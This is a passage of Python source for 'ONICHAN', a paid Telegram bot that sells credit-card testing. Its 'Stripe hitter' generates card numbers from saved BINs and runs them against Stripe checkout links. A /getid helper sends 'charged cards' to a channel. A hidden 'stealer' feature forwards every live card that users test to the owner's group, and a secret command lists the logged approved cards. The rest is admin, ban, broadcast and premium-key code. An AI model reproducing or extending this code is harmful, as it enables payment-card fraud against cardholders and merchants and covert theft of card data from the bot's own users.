            "<b>Example:</b> <code>/ban 123456789</code>\n\n"
            "Permanently blocks the user from using the bot.\n"
            "Use <code>/unban &lt;user_id&gt;</code> to reverse.\n"
            "👑 Owner only.",
            parse_mode=ParseMode.HTML,
        )
        return
    
    try:
        target_id = int(context.args[0])
        
        # Add to banned
        with open(DB_BANNED, 'a') as f:
            f.write(f"{target_id}\n")
        invalidate_user_cache(target_id)  # flush permission cache

        await update.message.reply_text(ae(f"✅ User {target_id} banned!"))
        
    except Exception as e:
        await update.message.reply_text(ae(f"❌ Error: {str(e)}"))

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Broadcast message to all users - Owner only"""
    user = update.effective_user
    
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return
    
    if not context.args:
        await update.message.reply_text(
            "📢 <b>Broadcast</b>\n\n"
            "<b>Usage:</b> <code>/broadcast &lt;message&gt;</code>\n\n"
            "<b>Example:</b>\n"
            "<code>/broadcast Bot will be down for maintenance in 10 minutes.</code>\n\n"
            "Sends your message to ALL bot users.\n"
            "👑 Owner only.",
            parse_mode=ParseMode.HTML,
        )
        return
    
    raw_text = update.message.text
    prefix = raw_text.split(None, 1)
    if len(prefix) < 2:
        await update.message.reply_text(
            "📢 <b>Broadcast</b>\n\n"
            "<b>Usage:</b> <code>/broadcast &lt;message&gt;</code>\n\n"
            "<b>Example:</b>\n"
            "<code>/broadcast Bot will be down for maintenance in 10 minutes.</code>",
            parse_mode=ParseMode.HTML,
        )
        return
    message = prefix[1]
    
    users = set()
    for file in [DB_OWNER, DB_PREMIUM, DB_FREE]:
        try:
            with open(file, 'r') as f:
                for line in f:
                    if line.strip().isdigit():
                        users.add(int(line.strip()))
                    elif ' ' in line:
                        users.add(int(line.split()[0]))
        except:
            pass
    
    success = 0
    failed = 0
    
    status_msg = await update.message.reply_text(ae("📢 Broadcasting..."))
    
    for user_id in users:
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=message
            )
            success += 1
            await asyncio.sleep(0.1)
        except:
            failed += 1
    
    await status_msg.edit_text(
        f"📢 <b>Broadcast Complete!</b>\n\n"
        f"✅ Sent: {success}\n"
        f"❌ Failed: {failed}",
        parse_mode=ParseMode.HTML
    )

async def unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Unban a user - Owner only"""
    user = update.effective_user
    
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return
    
    if not context.args:
        await update.message.reply_text(
            "🔓 <b>Unban User</b>\n\n"
            "<b>Usage:</b> <code>/unban &lt;user_id&gt;</code>\n\n"
            "<b>Example:</b> <code>/unban 123456789</code>\n\n"
            "Lifts the ban and restores access for the user.\n"
            "👑 Owner only.",
            parse_mode=ParseMode.HTML,
        )
        return
    
    try:
        target_id = int(context.args[0])
        
        # Remove from banned
        try:
            with open(DB_BANNED, 'r') as f:
                lines = f.readlines()
            with open(DB_BANNED, 'w') as f:
                for line in lines:
                    if not line.strip() == str(target_id):
                        f.write(line)
        except:
            pass
        invalidate_user_cache(target_id)  # flush permission cache

        await update.message.reply_text(ae(f"✅ User {target_id} unbanned!"))
        
    except Exception as e:
        await update.message.reply_text(ae(f"❌ Error: {str(e)}"))

async def bot_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show detailed bot statistics - Owner only"""
    user = update.effective_user
    
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return
    
    try:
        with open(DB_OWNER, 'r') as f:
            owners = [l.strip() for l in f if l.strip()]
        with open(DB_PREMIUM, 'r') as f:
            premium = [l.strip() for l in f if l.strip()]
        with open(DB_FREE, 'r') as f:
            free = [l.strip() for l in f if l.strip()]
        with open(DB_BANNED, 'r') as f:
            banned = [l.strip() for l in f if l.strip()]
        with open(DB_PENDING, 'r') as f:
            pending = [l.strip() for l in f if l.strip()]
    except:
        owners = premium = free = banned = pending = []
    
    total_users = len(set(owners + premium + free))
    
    sep = "━━━━━━━━━━━━━━━━━━━━"
    text = ae(f"""💜 <b>ONICHAN • STATS</b>
{sep}
👥 <b>Total</b>   : {total_users}
👑 <b>Owners</b>  : {len(owners)}
💎 <b>Premium</b> : {len(premium)}
🆓 <b>Free</b>    : {len(free)}
⏳ <b>Pending</b> : {len(pending)}
🚫 <b>Banned</b>  : {len(banned)}
{sep}
🚪 <b>Gates</b> : 29+ | 🔧 <b>Tools</b> : 8
{sep}
🤖 @{BOT_USERNAME} | 👑 @{OWNER_USERNAME}""")
    
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)

async def pending_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show pending users - Owner only"""
    user = update.effective_user
    
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return
    
    try:
        with open(DB_PENDING, 'r') as f:
            pending = f.readlines()
    except:
        pending = []
    
    if not pending:
        await update.message.reply_text(ae("✅ No pending users!"))
        return
    
    text = "⏳ <b>PENDING USERS</b>\n\n"
    
    for line in pending[:10]:  # Show first 10
        if '|' in line:
            parts = line.strip().split('|')
            if len(parts) >= 3:
                user_id, username, name = parts[0], parts[1], parts[2]
                text += f"👤 {name}\n"
                text += f"🆔 <code>{user_id}</code>\n"
                text += f"👤 @{username}\n"
                text += f"Use: /approve {user_id}\n\n"
    
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)

async def add_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Add admin - Owner only"""
    user = update.effective_user
    
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return
    
    if not context.args:
        await update.message.reply_text(
            "❌ <b>Invalid Format!</b>\n\n"
            "🎯 <b>Usage:</b>\n"
            "<code>/addadmin [user_id]</code>\n\n"
            "💡 <b>Example:</b>\n"
            "<code>/addadmin 123456789</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    try:
        target_id = int(context.args[0])
        
        # Check if already admin
        if is_owner(target_id):
            await update.message.reply_text(ae("⚠️ User is already an admin!"))
            return
        
        # Add to owners
        with open(DB_OWNER, 'a') as f:
            f.write(f"{target_id}\n")
        
        # Get target user info
        try:
            target_user = await context.bot.get_chat(target_id)
            target_name = target_user.username or target_user.first_name
        except:
            target_name = str(target_id)
        
        await update.message.reply_text(
            f"✅ <b>Admin Added!</b>\n\n"
            f"👤 User: {target_name}\n"
            f"🆔 ID: <code>{target_id}</code>\n\n"
            f"They now have full admin access!",
            parse_mode=ParseMode.HTML
        )
        
        # Notify user
        try:
            await context.bot.send_message(
                chat_id=target_id,
                text=ae("👑 <b>ADMIN ACCESS GRANTED!</b>\n\n"
                     "🎉 Congratulations!\n"
                     "You now have admin privileges!\n\n"
                     "You can now:\n"
                     "• Approve users\n"
                     "• Give premium\n"
                     "• Ban users\n"
                     "• View statistics\n"
                     "• Generate keys\n"
                     "• And more!\n\n"
                     "Send /help to see all commands."),
                parse_mode=ParseMode.HTML
            )
        except:
            pass
            
    except ValueError:
        await update.message.reply_text(ae("❌ User ID must be a number!"))
    except Exception as e:
        await update.message.reply_text(ae(f"❌ Error: {str(e)}"))

async def remove_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove admin - Owner only"""
    user = update.effective_user
    
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return
    
    if not context.args:
        await update.message.reply_text(
            "❌ <b>Invalid Format!</b>\n\n"
            "🎯 <b>Usage:</b>\n"
            "<code>/removeadmin [user_id]</code>\n\n"
            "💡 <b>Example:</b>\n"
            "<code>/removeadmin 123456789</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    try:
        target_id = int(context.args[0])
        
        # Don't allow removing main owner
        if target_id == OWNER_ID:
            await update.message.reply_text(ae("❌ Cannot remove main owner!"))
            return
        
        # Remove from owners
        try:
            with open(DB_OWNER, 'r') as f:
                lines = f.readlines()
            
            with open(DB_OWNER, 'w') as f:
                removed = False
                for line in lines:
                    if line.strip() != str(target_id):
                        f.write(line)
                    else:
                        removed = True
            
            if removed:
                await update.message.reply_text(
                    f"✅ <b>Admin Removed!</b>\n\n"
                    f"🆔 ID: <code>{target_id}</code>\n\n"
                    f"Admin access has been revoked.",
                    parse_mode=ParseMode.HTML
                )
                
                # Notify user
                try:
                    await context.bot.send_message(
                        chat_id=target_id,
                        text=ae("⚠️ <b>Admin Access Revoked</b>\n\n"
                             "Your admin privileges have been removed."),
                        parse_mode=ParseMode.HTML
                    )
                except:
                    pass
            else:
                await update.message.reply_text(ae("❌ User is not an admin!"))
        except:
            await update.message.reply_text(ae("❌ Error removing admin!"))
            
    except ValueError:
        await update.message.reply_text(ae("❌ User ID must be a number!"))
    except Exception as e:
        await update.message.reply_text(ae(f"❌ Error: {str(e)}"))

async def get_chat_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Get current chat ID - Owner only"""
    user = update.effective_user
    
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return
    
    chat_id = update.effective_chat.id
    chat_type = update.effective_chat.type
    chat_title = update.effective_chat.title if hasattr(update.effective_chat, 'title') else 'Private Chat'
    
    text = ae(f"""🆔 <b>CHAT ID INFORMATION</b>

━━━━━━━━━━━━━━━━━━━━━━

📊 <b>Chat ID:</b> <code>{chat_id}</code>
📝 <b>Chat Type:</b> {chat_type}
🏷️ <b>Chat Title:</b> {chat_title}

━━━━━━━━━━━━━━━━━━━━━━

💡 <b>How to use:</b>

1. Add bot to your private channel/group
2. Send /getid in that channel
3. Copy the Chat ID
4. Update config.py:
   <code>CHARGED_CARDS_CHANNEL = {chat_id}</code>

━━━━━━━━━━━━━━━━━━━━━━

✅ All charged cards will be sent there automatically!""")
    
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)


def _get_trial_info_text(info):
    """Extract trial info text from checkout info dict"""
    if not info.get("is_trial"):
        return None
    parts = []
    trial_days = info.get("trial_period_days")
    if trial_days:
        parts.append(f"{trial_days}-day free trial")
    else:
        parts.append("Free Trial")
    after_price = info.get("after_trial_price")
    if after_price:
        parts.append(f"then {after_price}")
    if info.get("setup_intent"):
        parts.append("(SetupIntent)")
    return " | ".join(parts)


import re as _re

def _strip_tg_emoji(text: str) -> str:
    """Remove <tg-emoji> tags, keeping the fallback text inside."""
    return _re.sub(r'<tg-emoji[^>]*>(.*?)</tg-emoji>', r'\1', text, flags=_re.DOTALL)

async def _safe_edit(msg, text, parse_mode=None, reply_markup=None):
    """Edit a Telegram message. Falls back to stripped text if HTML parse fails."""
    kwargs = {"reply_markup": reply_markup} if reply_markup else {}
    try:
        await msg.edit_text(text, parse_mode=parse_mode, **kwargs)
        return
    except Exception as e:
        err = str(e)
        # Silently skip "Message is not modified"
        if "not modified" in err.lower():
            return
        print(f"[EDIT_ERR] {err[:120]}")
    # Fallback: strip tg-emoji tags and retry without parse_mode for safety
    try:
        plain = _strip_tg_emoji(text)
        await msg.edit_text(plain, parse_mode=parse_mode, **kwargs)
    except Exception as e2:
        print(f"[EDIT_ERR_FALLBACK] {str(e2)[:120]}")

async def _build_hit_status_text(merchant, price_str, success_url, cards, card_statuses, progress_done, email=None, trial_info=None):
    """Build the card-by-card status message"""
    done_icon = "✅ Done" if progress_done >= len(cards) else "⚡ Running..."
    safe_url = html.escape(str(success_url or "N/A"))
    url_short = safe_url[:50] + "..." if len(safe_url) > 50 else safe_url
    safe_price = html.escape(str(price_str or "N/A"))
    sep = "━━━━━━━━━━━━━━━━━━━━"
    text = (
        f"💜 <b>ONICHAN • STRIPE HITTER</b>\n"
        f"{sep}\n"
        f"🔗 <b>Link</b>      : {url_short}\n"
        f"🏪 <b>Merchant</b>  : {merchant} — {safe_price}\n"
        f"📊 <b>Progress</b>  : {progress_done}/{len(cards)} — {done_icon}\n"
    )
    if trial_info:
        text += f"🔐 <b>Trial</b>     : {html.escape(str(trial_info))}\n"
    text += f"{sep}\n"
    for idx, card in enumerate(cards):
        cc = card['cc']
        masked = f"{cc[:6]}xxxxx{cc[-4:]}|{card['month']}|{card['year']}"
        status = card_statuses[idx]
        text += f"💳 {masked} → {status}\n"
    text += sep
    return ae(text)


async def hit_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle Hit All / Hit First / Close / Stop button callbacks"""
    query = update.callback_query
    user = query.from_user
    data = query.data
    
    if data.startswith("hitclose_"):
        hit_key = data.replace("hitclose_", "")
        _pending_hits.pop(hit_key, None)
        await query.answer("Closed")
        await query.message.delete()
        return
    
    if data.startswith("hitstop_"):
        hit_key = data.replace("hitstop_", "")
        _active_hits[hit_key] = False
        await query.answer("Stopping...")
        return

    # Saved BIN picker callback
    if data.startswith("sbin_cancel_"):
        await query.answer("Cancelled.")
        try:
            await query.message.delete()
        except:
            pass
        return

    if data.startswith("sbin_"):
        parts = data.split("_", 2)
        if len(parts) < 3:
            await query.answer("Invalid selection.", show_alert=True)
            return
        _, uid_str, bin_name = parts[0], parts[1], parts[2]
        try:
            uid = int(uid_str)
        except ValueError:
            await query.answer("Invalid user.", show_alert=True)
            return
        if query.from_user.id != uid:
            await query.answer("This is not your session.", show_alert=True)
            return
        pending = _pending_bin_hits.pop(uid, None)
        url = pending["url"] if pending else None

        # Fallback: extract URL from the original /hit command message
        if not url:
            try:
                orig = query.message.reply_to_message
                if orig and orig.text:
                    m = re.search(r'https?://\S+', orig.text)
                    if m:
                        url = m.group(0)
            except Exception:
                pass

        if not url:
            await query.answer("Session expired! Send /hit again.", show_alert=True)
            return
        saved = get_user_saved_bins(uid)
        chosen = next((b for b in saved if b["name"] == bin_name), None)
        if not chosen:
            await query.answer("BIN not found.", show_alert=True)
            return
        await query.answer(f"Generating from BIN {chosen['bin_value'][:6]}...")
        try:
            await query.message.delete()
        except:
            pass
        gen_result = parse_gen_input(chosen["bin_value"])
        if gen_result:
            prefix, mm, yy, cvv_pat = gen_result
            gen_lines = generate_cards_from_bin(prefix, mm, yy, cvv_pat, 10)
            cards = auto_hitter_parse_cards("\n".join(gen_lines))
        else:
            cards = []
        if not cards:
            await query.message.reply_text(ae("❌ Could not generate cards from saved BIN."))
            return
        loading_msg = await context.bot.send_message(
            chat_id=query.message.chat.id,
            text=ae(f"⚡ <b>Fetching checkout...</b>\n<i>BIN: {html.escape(chosen['bin_value'][:6])}*** ({len(cards)} cards)</i>"),
            parse_mode=ParseMode.HTML
        )
        await _run_auto_hit(query, context, url, cards, loading_msg)
        return




async def set_stealer(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set stealer group ID - Owner only"""
    user = update.effective_user
    
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return
    
    if not context.args:
        current_id = get_stealer_group_id()
        if current_id:
            await update.message.reply_text(
                f"🔐 <b>STEALER GROUP</b>\n\n"
                f"📊 <b>Current Group ID:</b> <code>{current_id}</code>\n\n"
                f"💡 <b>Usage:</b> <code>/setstealer [group_id]</code>\n"
                f"🗑️ <b>To disable:</b> <code>/setstealer off</code>",
                parse_mode=ParseMode.HTML
            )
        else:
            await update.message.reply_text(
                f"🔐 <b>STEALER GROUP</b>\n\n"
                f"⚠️ <b>Not configured</b>\n\n"
                f"💡 <b>Usage:</b> <code>/setstealer [group_id]</code>\n\n"
                f"📋 <b>How to get Group ID:</b>\n"
                f"1. Add bot to your private group\n"
                f"2. Send /getid in that group\n"
                f"3. Copy the Chat ID and use it here",
                parse_mode=ParseMode.HTML
            )
        return
    
    arg = context.args[0].lower()
    
    if arg == "off" or arg == "disable" or arg == "none":
        if set_stealer_group_id(None):
            await update.message.reply_text(
                "✅ <b>Stealer Disabled!</b>\n\n"
                "Approved cards will no longer be sent to a group.",
                parse_mode=ParseMode.HTML
            )
        else:
            await update.message.reply_text(ae("❌ Error disabling stealer!"))
        return
    
    try:
        group_id = int(context.args[0])
        
        if set_stealer_group_id(group_id):
            await update.message.reply_text(
                f"✅ <b>Stealer Group Set!</b>\n\n"
                f"📊 <b>Group ID:</b> <code>{group_id}</code>\n\n"
                f"🔥 All approved/live/charged cards will now be automatically sent to this group!",
                parse_mode=ParseMode.HTML
            )
        else:
            await update.message.reply_text(ae("❌ Error setting stealer group!"))
    except ValueError:
        await update.message.reply_text(
            "❌ <b>Invalid Group ID!</b>\n\n"
            "Group ID must be a number (usually negative for groups).\n\n"
            "💡 Use /getid in your group to get the correct ID.",
            parse_mode=ParseMode.HTML
        )

async def test_stealer(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Test stealer by sending a test message - Owner only"""
    user = update.effective_user
    
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return
    
    stealer_group_id = get_stealer_group_id()
    
    if not stealer_group_id:
        await update.message.reply_text(
            "❌ <b>Stealer Not Configured!</b>\n\n"
            "Use /setstealer [group_id] to set up first.\n"
            "Use /getid in your group to get the Chat ID.",
            parse_mode=ParseMode.HTML
        )
        return
    
    try:
        from datetime import datetime
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        test_message = f"""🧪 <b>STEALER TEST MESSAGE</b> 🧪

━━━━━━━━━━━━━━━━━━━━━━

✅ <b>Stealer is working!</b>

📊 <b>Group ID:</b> <code>{stealer_group_id}</code>
👤 <b>Tested by:</b> @{user.username or user.first_name}
⏰ <b>Time:</b> {timestamp}

━━━━━━━━━━━━━━━━━━━━━━

🔥 Approved cards will be sent here automatically!"""

        await context.bot.send_message(
            chat_id=stealer_group_id,
            text=test_message,
            parse_mode='HTML'
        )
        
        await update.message.reply_text(
            f"✅ <b>Test Successful!</b>\n\n"
            f"Message sent to group <code>{stealer_group_id}</code>\n\n"
            f"Check your stealer group for the test message!",
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        error_msg = str(e)
        await update.message.reply_text(
            f"❌ <b>Test Failed!</b>\n\n"
            f"<b>Error:</b> {error_msg}\n\n"
            f"<b>Possible fixes:</b>\n"
            f"1. Make sure the bot is added to the group\n"
            f"2. Make sure the bot has permission to send messages\n"
            f"3. Verify the group ID is correct (use /getid in the group)\n"
            f"4. Group IDs are usually negative (like -1001234567890)",
            parse_mode=ParseMode.HTML
        )

async def list_admins(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List all admins - Owner only"""
    user = update.effective_user
    
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return
    
    try:
        with open(DB_OWNER, 'r') as f:
            admins = [int(line.strip()) for line in f if line.strip().isdigit()]
    except:
        admins = []
    
    text = ae(f"""👑 <b>ADMIN LIST</b>

━━━━━━━━━━━━━━━━━━━━━━

📊 <b>Total Admins:</b> {len(admins)}

━━━━━━━━━━━━━━━━━━━━━━

👥 <b>Admins:</b>

""")
    
    for i, admin_id in enumerate(admins, 1):
        # Try to get username
        try:
            admin_user = await context.bot.get_chat(admin_id)
            admin_name = f"@{admin_user.username}" if admin_user.username else admin_user.first_name
        except:
            admin_name = "Unknown"
        
        owner_badge = " 👑" if admin_id == OWNER_ID else ""
        text += f"<b>{i}.</b> {admin_name}{owner_badge}\n"
        text += f"   🆔 <code>{admin_id}</code>\n\n"
    
    text += f"""━━━━━━━━━━━━━━━━━━━━━━

💡 <b>Commands:</b>
<code>/addadmin [id]</code> - Add admin
<code>/removeadmin [id]</code> - Remove admin
<code>/admins</code> - View all admins"""
    
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)

async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List all users - Owner only"""
    user = update.effective_user
    
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return
    
    try:
        with open(DB_OWNER, 'r') as f:
            owners = [l.strip() for l in f if l.strip()]
        with open(DB_PREMIUM, 'r') as f:
            premium = [l.strip() for l in f if l.strip()]
        with open(DB_FREE, 'r') as f:
            free = [l.strip() for l in f if l.strip()]
    except:
        owners = premium = free = []
    
    text = ae(f"""👥 <b>ALL USERS</b>

👑 <b>Admins:</b> {len(owners)}
💎 <b>Premium:</b> {len(premium)}
🆓 <b>Free:</b> {len(free)}
📊 <b>Total:</b> {len(set(owners + premium + free))}

<b>Recent Users:</b>
""")
    
    # Show recent free users
    for i, user_line in enumerate(free[-5:], 1):
        text += f"{i}. <code>{user_line}</code>\n"
    
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)

async def secret_approved(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """SECRET: View all approved cards - Owner only"""
    user = update.effective_user
    
    if not is_owner(user.id):
        return  # Silent fail for security
    
    approved_cards = get_approved_cards(30)
    total_count = get_approved_count()
    
    if not approved_cards:
        await update.message.reply_text(ae("🔒 <b>No approved cards yet</b>"), parse_mode=ParseMode.HTML)
        return
    
    text = ae(f"""🔒 <b>SECRET - APPROVED CARDS</b> 🔒

📊 <b>Total Approved:</b> {total_count}
📋 <b>Showing Last:</b> {len(approved_cards)}

━━━━━━━━━━━━━━━━━━━━━━

""")
    
    for i, card_line in enumerate(approved_cards[-20:], 1):
        parts = card_line.split('|')
        if len(parts) >= 4:
            timestamp = parts[0]
            user_id = parts[1]
            username = parts[2]
            card = parts[3]
            text += f"<b>{i}.</b> <code>{card}</code>\n"
            text += f"   👤 {username} | ⏰ {timestamp}\n\n"
    
    text += f"""━━━━━━━━━━━━━━━━━━━━━━

🔒 <b>This is a secret command</b>
📁 Full log: Database/approved_log.txt"""
    
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)

async def revenue_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """View revenue statistics - Owner only"""
    user = update.effective_user
    
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return
    
    stats = get_payment_stats()
    total_revenue = get_total_revenue()
    
    text = ae(f"""💰 <b>REVENUE STATISTICS</b>

━━━━━━━━━━━━━━━━━━━━━━

💵 <b>Total Revenue:</b> ${total_revenue:.2f}
📊 <b>Total Sales:</b> {stats['count']}
💎 <b>Average Sale:</b> ${total_revenue/stats['count'] if stats['count'] > 0 else 0:.2f}

━━━━━━━━━━━━━━━━━━━━━━

📋 <b>Sales by Plan:</b>

""")
    
    for plan_name, count in stats['plans'].items():
        text += f"• {plan_name}: {count} sales\n"
    
    text += f"""
━━━━━━━━━━━━━━━━━━━━━━

📞 <b>Contact:</b> @tu_bkl_hai
📢 <b>Channel:</b> @krishnaslounge"""
    
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)

async def generate_premium_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generate premium key - Owner only"""
    user = update.effective_user
    
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return
    
    if not context.args:
        await update.message.reply_text(
            "❌ <b>Invalid Format!</b>\n\n"
            "🎯 <b>Usage:</b>\n"
            "<code>/genkey [days] [count]</code>\n\n"
            "💡 <b>Examples:</b>\n"
            "<code>/genkey 7</code> - 1 key for 7 days\n"
            "<code>/genkey 10 5</code> - 5 keys for 10 days\n"
            "<code>/genkey 30 10</code> - 10 keys for 30 days",
            parse_mode=ParseMode.HTML
        )
        return
    
    try:
        days = int(context.args[0])
        count = int(context.args[1]) if len(context.args) > 1 else 1
        
        if days < 1:
            await update.message.reply_text(ae("❌ Days must be at least 1!"))
            return
        
        if count < 1 or count > 50:
            await update.message.reply_text(ae("❌ Count must be between 1 and 50!"))
            return
        
        # Show generating message
        status_msg = await update.message.reply_text(ae(f"⏳ Generating {count} key(s) for {days} days..."))
        
        # Generate keys in thread pool to avoid blocking (database uses sync calls)
        loop = asyncio.get_running_loop()
        try:
            keys = await asyncio.wait_for(
                loop.run_in_executor(None, create_batch_keys, count, days, user.id),
                timeout=30.0
            )
        except asyncio.TimeoutError:
            await status_msg.edit_text(
                "❌ <b>Timeout generating keys!</b>\n\n"
                "Database took too long to respond.\n"
                "Please try again.",
                parse_mode=ParseMode.HTML
            )
            return
        
        if not keys:
            await status_msg.edit_text(
                "❌ <b>Error generating keys!</b>\n\n"
                "Database connection may have issues.\n"
                "Please try again in a moment.",
                parse_mode=ParseMode.HTML
            )
            return
        
        # Format with nice UI
        text = format_keys_display(keys, days)
        await status_msg.edit_text(text, parse_mode=ParseMode.HTML)
        
    except ValueError:
        await update.message.reply_text(ae("❌ Days and count must be numbers!"))
    except Exception as e:
        import traceback
        print(f"[GenKey] Error: {e}\n{traceback.format_exc()}")
        await update.message.reply_text(ae(f"❌ Error: {str(e)}"))

async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Broadcast message to all users - Owner/Admin only"""
    user = update.effective_user
    
    # Admin check
    ADMIN_IDS = [8119946836, 8268257476, 8271254197]
    if user.id not in ADMIN_IDS:
        await update.message.reply_text(ae("❌ Admin only!"))
        return
    
    if not context.args:
        await update.message.reply_text(
            "📢 <b>Broadcast Command</b>\n\n"
            "<b>Usage:</b> <code>/broadcast your message</code>\n\n"
            "<b>Example:</b>\n"
            "<code>/broadcast 🔥 New gate added! Check /pp</code>\n\n"
            "⚠️ <i>This sends to ALL bot users!</i>",
            parse_mode=ParseMode.HTML
        )
        return
    
    raw_text = update.message.text
    prefix = raw_text.split(None, 1)
    if len(prefix) < 2:
        await update.message.reply_text(
            "📢 <b>Broadcast Command</b>\n\n"
            "<b>Usage:</b> <code>/broadcast your message</code>\n\n"
            "⚠️ <i>This sends to ALL bot users!</i>",
            parse_mode=ParseMode.HTML
        )
        return
    message = prefix[1]
    
    from modules.database import get_approved_users_sync
    
    status_msg = await update.message.reply_text(ae("📢 <b>Broadcasting...</b>"), parse_mode=ParseMode.HTML)
    
    try:
        loop = asyncio.get_running_loop()
        users = await loop.run_in_executor(None, get_approved_users_sync)
        
        if not users:
            await status_msg.edit_text(ae("❌ No users found!"))
            return
        
        success = 0
        failed = 0
        
        for user_id in users:
            try:
                await context.bot.send_message(
                    chat_id=user_id,
                    text=message
                )
                success += 1
                await asyncio.sleep(0.1)
            except Exception as e:
                error_msg = str(e).lower()
                if "blocked" in error_msg or "deactivated" in error_msg or "not found" in error_msg:
                    failed += 1
                else:
                    try:
                        await asyncio.sleep(1)
                        await context.bot.send_message(
                            chat_id=user_id,
                            text=message
                        )
                        success += 1
                    except:
                        failed += 1
        
        await status_msg.edit_text(
            f"✅ <b>Broadcast Complete!</b>\n\n"
            f"📨 <b>Sent:</b> {success}\n"
            f"❌ <b>Failed:</b> {failed}\n"
            f"👥 <b>Total:</b> {len(users)}",
            parse_mode=ParseMode.HTML
        )
        
    except Exception as e:
        await status_msg.edit_text(ae(f"❌ Error: {str(e)}"))

async def redeem_premium_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Redeem premium key - Any user"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "❌ <b>Invalid Format!</b>\n\n"
            "🎯 <b>Usage:</b>\n"
            "<code>/redeem ONICHAN-XXXX-XXXX-XXXX</code>\n\n"
            "💡 <b>Example:</b>\n"
            "<code>/redeem ONICHAN-AB12-CD34-EF56</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    key = context.args[0].upper()
    
    # Validate key format (accept both ONICHAN and MOMO for backwards compatibility)
    if not key.startswith("ONICHAN-") and not key.startswith("MOMO-"):
        await update.message.reply_text(ae("❌ Invalid key format!"))
        return
    
    # Redeem key in thread pool to avoid blocking
    status_msg = await update.message.reply_text(ae("⏳ Redeeming key..."))
    
    loop = asyncio.get_running_loop()
    try:
        result = await asyncio.wait_for(
            loop.run_in_executor(None, redeem_key, key, user.id, user.username or user.first_name),
            timeout=15.0
        )
    except asyncio.TimeoutError:
        await status_msg.edit_text(ae("❌ Timeout! Please try again."), parse_mode=ParseMode.HTML)
        return
    except Exception as e:
        await status_msg.edit_text(ae(f"❌ Error: {str(e)}"), parse_mode=ParseMode.HTML)
        return
    
    if result['success']:
        # Add to premium users - update PostgreSQL first
        from datetime import datetime, timedelta
        from modules.database import set_premium_sync, add_user_sync
        
        expiry = datetime.now() + timedelta(days=result['days'])
        expiry_str = expiry.strftime("%Y-%m-%d")
        
        # Ensure user exists in database first
        add_user_sync(user.id, user.username or user.first_name, "approved")
        
        # Set premium in PostgreSQL database
        set_premium_sync(user.id, result['days'])
        invalidate_user_cache(user.id)  # flush permission cache

        # Also write to local file as backup
        try:
            with open(DB_PREMIUM, 'a') as f:
                f.write(f"{user.id} {expiry_str}\n")
        except:
            pass
        
        text = ae(f"""✅ <b>KEY REDEEMED SUCCESSFULLY!</b>

━━━━━━━━━━━━━━━━━━━━━━

🎉 <b>Congratulations!</b>
You now have premium access!

⏰ <b>Duration:</b> {result['days']} days
📅 <b>Expires:</b> {result['expiry_date']}

━━━━━━━━━━━━━━━━━━━━━━

💎 <b>Premium Features Unlocked:</b>
• 20 cards per mass check
• All 18 charge gates
• Priority support
• No cooldown

━━━━━━━━━━━━━━━━━━━━━━

🎯 <b>Start using premium features now!</b>
Send /help to see all commands.""")
        
        await status_msg.edit_text(text, parse_mode=ParseMode.HTML)
        
        # Notify owner
        try:
            await context.bot.send_message(
                chat_id=OWNER_ID,
                text=f"🔑 <b>Key Redeemed!</b>\n\n"
                     f"👤 User: @{user.username or user.first_name}\n"
                     f"🆔 ID: <code>{user.id}</code>\n"
                     f"🎫 Key: <code>{key}</code>\n"
                     f"⏰ Duration: {result['days']} days",
                parse_mode=ParseMode.HTML
            )
        except:
            pass
    else:
        await status_msg.edit_text(ae(f"❌ {result['message']}"), parse_mode=ParseMode.HTML)

async def list_keys(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List all premium keys - Owner only"""
    user = update.effective_user
    
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return
    
    stats = get_key_stats()
    active_keys = get_active_keys()
    
    text = ae(f"""🔑 <b>PREMIUM KEYS</b>

━━━━━━━━━━━━━━━━━━━━━━

📊 <b>Statistics:</b>
• Total Keys: {stats['total']}
